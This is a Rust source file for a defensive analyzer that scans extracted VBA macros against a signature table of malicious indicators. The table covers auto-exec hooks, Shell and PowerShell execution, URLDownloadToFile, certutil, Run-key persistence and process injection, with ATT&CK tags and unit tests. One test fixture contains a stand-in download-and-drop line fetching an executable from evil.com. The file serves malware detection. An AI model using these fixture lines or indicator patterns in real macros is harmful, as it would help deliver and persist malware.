//! `ole_macro_analyzer` — VBA macro security analysis
//!
//! Analyses extracted VBA source code for indicators of malicious behaviour:
//!
//! * Auto-execute hooks (`AutoOpen`, `AutoClose`, `Workbook_Open`,
//!   `Document_Open`, `Auto_Open`, `AutoExec`, `Workbook_BeforeClose`).
//! * Shell / command execution (`Shell`, `WScript`, `CreateObject`,
//!   `Environ("COMSPEC")`, `cmd.exe` references).
//! * Network download patterns (`URLDownloadToFile`, `MSXML2.XMLHTTP`,
//!   `WinHttp.WinHttpRequest`, `ServerXMLHTTP`, `Msxml2.ServerXMLHTTP`).
//! * Obfuscation indicators (`Chr(`, `StrReverse`, `Hex(`, Base64-like
//!   constants, very long string literals).
//! * Persistence mechanisms (registry writes, startup folder paths).
//! * Process injection stubs (`VirtualAlloc`, `WriteProcessMemory`).
//! * Encoding / decoding (`Base64Decode`, `CryptoAPI`, `XOR` loops).
//!
//! All findings are classified by severity and tagged with the module name
//! and line number of the finding.

use serde::{Deserialize, Serialize};

// ---------------------------------------------------------------------------
// Severity
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
pub enum MacroSeverity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl std::fmt::Display for MacroSeverity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let s = match self {
            Self::Info     => "INFO",
            Self::Low      => "LOW",
            Self::Medium   => "MEDIUM",
            Self::High     => "HIGH",
            Self::Critical => "CRITICAL",
        };
        write!(f, "{s}")
    }
}

// ---------------------------------------------------------------------------
// Finding
// ---------------------------------------------------------------------------

/// A single suspicious indicator found in a VBA module.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MacroFinding {
    /// Short identifier.
    pub id: String,
    /// Human-readable description.
    pub description: String,
    /// Severity.
    pub severity: MacroSeverity,
    /// Module name containing this finding.
    pub module: String,
    /// 1-based line number within the module source.
    pub line: usize,
    /// The matching line text (trimmed).
    pub matched_line: String,
    /// Category / MITRE ATT&CK-style tag.
    pub tags: Vec<String>,
}

impl MacroFinding {
    fn new(
        id: &str,
        desc: &str,
        severity: MacroSeverity,
        module: &str,
        line: usize,
        matched: &str,
        tags: &[&str],
    ) -> Self {
        Self {
            id: id.to_owned(),
            description: desc.to_owned(),
            severity,
            module: module.to_owned(),
            line,
            matched_line: matched.trim().to_owned(),
            tags: tags.iter().map(std::string::ToString::to_string).collect(),
        }
    }
}

// ---------------------------------------------------------------------------
// Analysis result
// ---------------------------------------------------------------------------

/// Result of analysing one or more VBA modules.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MacroAnalysisResult {
    /// All findings, sorted by severity descending.
    pub findings: Vec<MacroFinding>,
    /// Set of auto-execute hook names found.
    pub auto_exec_hooks: Vec<String>,
    /// Modules that contain suspicious code.
    pub suspicious_modules: Vec<String>,
    /// Overall severity (highest severity found).
    pub overall_severity: MacroSeverity,
    /// True if any network download pattern was found.
    pub has_download: bool,
    /// True if any process creation pattern was found.
    pub has_process_exec: bool,
    /// True if any obfuscation pattern was found.
    pub has_obfuscation: bool,
}

impl MacroAnalysisResult {
    const fn new() -> Self {
        Self {
            findings: Vec::new(),
            auto_exec_hooks: Vec::new(),
            suspicious_modules: Vec::new(),
            overall_severity: MacroSeverity::Info,
            has_download: false,
            has_process_exec: false,
            has_obfuscation: false,
        }
    }

    fn add(&mut self, f: MacroFinding) {
        if f.severity > self.overall_severity { self.overall_severity = f.severity; }
        if !self.suspicious_modules.contains(&f.module) {
            self.suspicious_modules.push(f.module.clone());
        }
        self.findings.push(f);
    }

    fn finalize(&mut self) {
        self.findings.sort_by(|a, b| b.severity.cmp(&a.severity));
    }

    /// Return all findings for a specific module.
    #[must_use] 
    pub fn findings_for_module(&self, name: &str) -> Vec<&MacroFinding> {
        self.findings.iter().filter(|f| f.module == name).collect()
    }
}

// ---------------------------------------------------------------------------
// Signature table
// ---------------------------------------------------------------------------

struct Signature {
    id: &'static str,
    desc: &'static str,
    severity: MacroSeverity,
    keywords: &'static [&'static str],
    tags: &'static [&'static str],
    is_auto_exec: bool,
}

const SIGNATURES: &[Signature] = &[
    Signature {
        id: "AUTO_EXEC",
        desc: "Auto-execute macro hook found",
        severity: MacroSeverity::High,
        keywords: &[
            "Sub AutoOpen(", "Sub AutoClose(", "Sub Workbook_Open(",
            "Sub Document_Open(", "Sub Auto_Open(", "Sub AutoExec(",
            "Sub Workbook_BeforeClose(", "Sub Document_BeforeClose(",
            "Sub Worksheet_Activate(", "Sub Workbook_Activate(",
        ],
        tags: &["execution", "T1204.002"],
        is_auto_exec: true,
    },
    Signature {
        id: "SHELL_EXEC",
        desc: "Shell command execution",
        severity: MacroSeverity::Critical,
        keywords: &["Shell(", "Shell \"", "WScript.Shell", "CreateObject(\"WScript.Shell\")",
                    "Environ(\"COMSPEC\")", "cmd.exe", "powershell.exe", "pwsh.exe"],
        tags: &["execution", "T1059"],
        is_auto_exec: false,
    },
    Signature {
        id: "CREATE_OBJECT",
        desc: "CreateObject call (COM automation)",
        severity: MacroSeverity::Medium,
        keywords: &["CreateObject(", "GetObject("],
        tags: &["execution", "T1559"],
        is_auto_exec: false,
    },
    Signature {
        id: "URL_DOWNLOAD",
        desc: "Network download via URLDownloadToFile",
        severity: MacroSeverity::Critical,
        keywords: &["URLDownloadToFile", "URLDownloadToCacheFile"],
        tags: &["download", "T1105"],
        is_auto_exec: false,
    },
    Signature {
        id: "MSXML_HTTP",
        desc: "Network request via MSXML2.XMLHTTP",
        severity: MacroSeverity::Critical,
        keywords: &[
            "MSXML2.XMLHTTP", "Msxml2.ServerXMLHTTP", "WinHttp.WinHttpRequest",
            "Microsoft.XMLHTTP", "XMLHTTP",
        ],
        tags: &["download", "T1071.001"],
        is_auto_exec: false,
    },
    Signature {
        id: "OBFUSCATION_CHR",
        desc: "Chr() concatenation obfuscation",
        severity: MacroSeverity::High,
        keywords: &["Chr(", "ChrW("],
        tags: &["obfuscation", "T1027"],
        is_auto_exec: false,
    },
    Signature {
        id: "OBFUSCATION_STR",
        desc: "StrReverse / string manipulation obfuscation",
        severity: MacroSeverity::Medium,
        keywords: &["StrReverse(", "Hex(", "Oct("],
        tags: &["obfuscation", "T1027"],
        is_auto_exec: false,
    },
    Signature {
        id: "PERSISTENCE_REGISTRY",
        desc: "Registry write for persistence",
        severity: MacroSeverity::High,
        keywords: &["RegWrite", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"],
        tags: &["persistence", "T1547.001"],
        is_auto_exec: false,
    },
    Signature {
        id: "PERSISTENCE_STARTUP",
        desc: "Startup folder path access",
        severity: MacroSeverity::High,
        keywords: &["Startup", "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"],
        tags: &["persistence", "T1547.001"],
        is_auto_exec: false,
    },
    Signature {
        id: "PROCESS_INJECTION",
        desc: "Process injection via VirtualAlloc / WriteProcessMemory",
        severity: MacroSeverity::Critical,
        keywords: &["VirtualAlloc", "WriteProcessMemory", "CreateRemoteThread",
                    "OpenProcess", "VirtualAllocEx"],
        tags: &["injection", "T1055"],
        is_auto_exec: false,
    },
    Signature {
        id: "BASE64_DECODE",
        desc: "Base64 decode / encode operation",
        severity: MacroSeverity::Medium,
        keywords: &["Base64", "frombase64", "tobase64", "AAAAAAA", "MZAAAA"],
        tags: &["encoding", "T1027"],
        is_auto_exec: false,
    },
    Signature {
        id: "WSCRIPT_RUN",
        desc: "WScript.Run / WScript.Exec",
        severity: MacroSeverity::Critical,
        keywords: &["WScript.Run", "WScript.Exec", "objWMIService", "Win32_Process"],
        tags: &["execution", "T1059.005"],
        is_auto_exec: false,
    },
    Signature {
        id: "FILE_WRITE",
        desc: "File write operation (drop payload)",
        severity: MacroSeverity::High,
        keywords: &["Open For Output", "Open For Binary", "Put #", "FileCopy",
                    "ADODB.Stream", "SaveToFile"],
        tags: &["dropper", "T1105"],
        is_auto_exec: false,
    },
    Signature {
        id: "ENVIRON_CALL",
        desc: "Environ() call to query environment variables",
        severity: MacroSeverity::Low,
        keywords: &["Environ("],
        tags: &["discovery", "T1082"],
        is_auto_exec: false,
    },
    Signature {
        id: "HIDDEN_WINDOW",
        desc: "Hidden window style (WindowStyle=0)",
        severity: MacroSeverity::Medium,
        keywords: &["vbHide", "WindowStyle:=0", "0, False"],
        tags: &["defense_evasion", "T1564.003"],
        is_auto_exec: false,
    },
    Signature {
        id: "CERTUTIL_DL",
        desc: "certutil download/decode command",
        severity: MacroSeverity::Critical,
        keywords: &["certutil", "-urlcache", "-decode"],
        tags: &["download", "T1105"],
        is_auto_exec: false,
    },
    Signature {
        id: "POWERSHELL_INVOKE",
        desc: "PowerShell invocation from VBA",
        severity: MacroSeverity::Critical,
        keywords: &["powershell", "Invoke-Expression", "IEX", "EncodedCommand", "-enc "],
        tags: &["execution", "T1059.001"],
        is_auto_exec: false,
    },
];

// ---------------------------------------------------------------------------
// OleMacroAnalyzer
// ---------------------------------------------------------------------------

/// Analyses VBA source code modules for malicious indicators.
pub struct OleMacroAnalyzer {
    /// Lower-bound of `Chr()` calls per line to consider it obfuscation.
    pub chr_threshold: usize,
    /// Minimum length of a string literal to flag as suspicious.
    pub long_string_threshold: usize,
}

impl Default for OleMacroAnalyzer {
    fn default() -> Self {
        Self { chr_threshold: 3, long_string_threshold: 200 }
    }
}

impl OleMacroAnalyzer {
    #[must_use] 
    pub fn new() -> Self { Self::default() }

    /// Analyse a single VBA module.
    #[must_use] 
    pub fn analyze_module(
        &self,
        module_name: &str,
        source_code: &str,
    ) -> Vec<MacroFinding> {
        let mut findings = Vec::new();

        // Pre-compute lowercase versions of all signature keywords once, outside the
        // per-line loop, to avoid O(lines × sigs × keywords) string allocations.
        let sig_keywords_lower: Vec<Vec<String>> = SIGNATURES
            .iter()
            .map(|sig| sig.keywords.iter().map(|kw| kw.to_lowercase()).collect())
            .collect();

        for (line_no, line) in source_code.lines().enumerate() {
            let line_no = line_no + 1;
            let line_lower = line.to_lowercase();

            // Skip pure comment lines.
            if line.trim().starts_with('\'') { continue; }

            // Signature matching.
            for (sig, kws_lower) in SIGNATURES.iter().zip(sig_keywords_lower.iter()) {
                for kw in kws_lower {
                    if line_lower.contains(kw.as_str()) {
                        // For auto-exec signatures append the "auto-exec" tag to the finding.
                        let extra: &[&str] = if sig.is_auto_exec { &["auto-exec"] } else { &[] };
                        let all_tags: Vec<&str> = sig.tags.iter().copied().chain(extra.iter().copied()).collect();
                        findings.push(MacroFinding::new(
                            sig.id, sig.desc, sig.severity,
                            module_name, line_no, line, &all_tags,
                        ));
                        break; // Only flag each sig once per line.
                    }
                }
            }

            // Chr() obfuscation threshold.
            let chr_count = count_occurrences(&line_lower, "chr(");
            if chr_count >= self.chr_threshold {
                findings.push(MacroFinding::new(
                    "OBFUSCATION_CHR_DENSE",
                    "Dense Chr() obfuscation (multiple Chr calls on one line)",
                    MacroSeverity::High,
                    module_name, line_no, line,
                    &["obfuscation", "T1027"],
                ));
            }

            // Long string literal.
            if let Some(_long_str) = find_long_string_literal(line, self.long_string_threshold) {
                findings.push(MacroFinding::new(
                    "LONG_STRING_LITERAL",
                    "Very long string literal (possible encoded payload)",
                    MacroSeverity::Medium,
                    module_name, line_no, line,
                    &["obfuscation", "T1027"],
                ));
            }
        }

        // Deduplicate by (id, line).
        findings.sort_by(|a, b| (a.line, a.id.as_str()).cmp(&(b.line, b.id.as_str())));
        findings.dedup_by(|a, b| a.id == b.id && a.line == b.line);
        findings
    }

    /// Analyse multiple modules and return a consolidated result.
    #[must_use] 
    pub fn analyze_all(
        &self,
        modules: &[(&str, &str)], // (module_name, source_code)
    ) -> MacroAnalysisResult {
        let mut result = MacroAnalysisResult::new();

        for (name, source) in modules {
            let findings = self.analyze_module(name, source);
            for f in findings {
                // Track auto-exec hooks.
                if f.id == "AUTO_EXEC" && !result.auto_exec_hooks.contains(&f.matched_line) {
                    result.auto_exec_hooks.push(f.matched_line.clone());
                }
                if f.id == "URL_DOWNLOAD" || f.id == "MSXML_HTTP" { result.has_download = true; }
                if f.id == "SHELL_EXEC" || f.id == "WSCRIPT_RUN" { result.has_process_exec = true; }
                if f.id.starts_with("OBFUSCATION") || f.id == "LONG_STRING_LITERAL" {
                    result.has_obfuscation = true;
                }
                result.add(f);
            }
        }

        result.finalize();
        result
    }

    /// Identify which auto-execute hooks are present in `source`.
    #[must_use] 
    pub fn list_auto_exec_hooks(source: &str) -> Vec<String> {
        let known = [
            "Sub AutoOpen(", "Sub AutoClose(", "Sub Workbook_Open(",
            "Sub Document_Open(", "Sub Auto_Open(", "Sub AutoExec(",
            "Sub Workbook_BeforeClose(", "Sub Document_BeforeClose(",
            "Sub Worksheet_Activate(", "Sub Workbook_Activate(",
        ];
        let mut found = Vec::new();
        for line in source.lines() {
            let trimmed = line.trim();
            for &hook in &known {
                if trimmed.to_lowercase().starts_with(&hook.to_lowercase()) {
                    // Extract the sub name.
                    let sub_name = hook.trim_start_matches("Sub ").trim_end_matches('(');
                    if !found.contains(&sub_name.to_owned()) {
                        found.push(sub_name.to_owned());
                    }
                }
            }
        }
        found
    }

    /// Classify the overall threat level from a result.
    #[must_use] 
    pub const fn threat_label(result: &MacroAnalysisResult) -> &'static str {
        match result.overall_severity {
            MacroSeverity::Critical => "MALICIOUS",
            MacroSeverity::High     => "SUSPICIOUS",
            MacroSeverity::Medium   => "POSSIBLY_SUSPICIOUS",
            MacroSeverity::Low      => "LOW_RISK",
            MacroSeverity::Info     => "CLEAN",
        }
    }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn count_occurrences(haystack: &str, needle: &str) -> usize {
    let mut count = 0;
    let mut pos = 0;
    while let Some(p) = haystack[pos..].find(needle) {
        count += 1;
        pos += p + needle.len();
    }
    count
}

fn find_long_string_literal(line: &str, min_len: usize) -> Option<&str> {
    let mut in_string = false;
    let mut start = 0;
    for (i, ch) in line.char_indices() {
        if ch == '"' {
            if in_string {
                let len = i - start;
                if len >= min_len {
                    return Some(&line[start..i]);
                }
                in_string = false;
            } else {
                in_string = true;
                start = i + 1;
            }
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detect_auto_open() {
        let src = "Sub AutoOpen()\n    Shell \"cmd.exe\"\nEnd Sub\n";
        let analyzer = OleMacroAnalyzer::new();
        let findings = analyzer.analyze_module("Module1", src);
        let ids: Vec<&str> = findings.iter().map(|f| f.id.as_str()).collect();
        assert!(ids.contains(&"AUTO_EXEC"), "Expected AUTO_EXEC, got {ids:?}");
        assert!(ids.contains(&"SHELL_EXEC"), "Expected SHELL_EXEC, got {ids:?}");
    }

    #[test]
    fn detect_url_download() {
        let src = "    Dim x As String\n    URLDownloadToFile 0, \"http://evil.com/a.exe\", \"c:\\a.exe\", 0, 0\n";
        let analyzer = OleMacroAnalyzer::new();
        let findings = analyzer.analyze_module("Module1", src);
        assert!(findings.iter().any(|f| f.id == "URL_DOWNLOAD"));
    }

    #[test]
    fn detect_chr_obfuscation() {
        let src = "    x = Chr(72) & Chr(101) & Chr(108) & Chr(108) & Chr(111)\n";
        let analyzer = OleMacroAnalyzer::new();
        let findings = analyzer.analyze_module("Module1", src);
        assert!(findings.iter().any(|f| f.id.starts_with("OBFUSCATION_CHR")));
    }

    #[test]
    fn skip_comment_lines() {
        let src = "    ' Shell \"cmd.exe\"\n";
        let analyzer = OleMacroAnalyzer::new();
        let findings = analyzer.analyze_module("Module1", src);
        assert!(!findings.iter().any(|f| f.id == "SHELL_EXEC"));
    }

    #[test]
    fn list_auto_exec_hooks() {
        let src = "Sub AutoOpen()\nEnd Sub\nSub Workbook_Open()\nEnd Sub\n";
        let hooks = OleMacroAnalyzer::list_auto_exec_hooks(src);
        assert!(hooks.contains(&"AutoOpen".to_owned()));
        assert!(hooks.contains(&"Workbook_Open".to_owned()));
    }

    #[test]
    fn threat_label_critical() {
        let mut r = MacroAnalysisResult::new();
        r.overall_severity = MacroSeverity::Critical;
        assert_eq!(OleMacroAnalyzer::threat_label(&r), "MALICIOUS");
    }

    #[test]
    fn count_occurrences_basic() {
        assert_eq!(count_occurrences("aababab", "ab"), 3);
    }
}
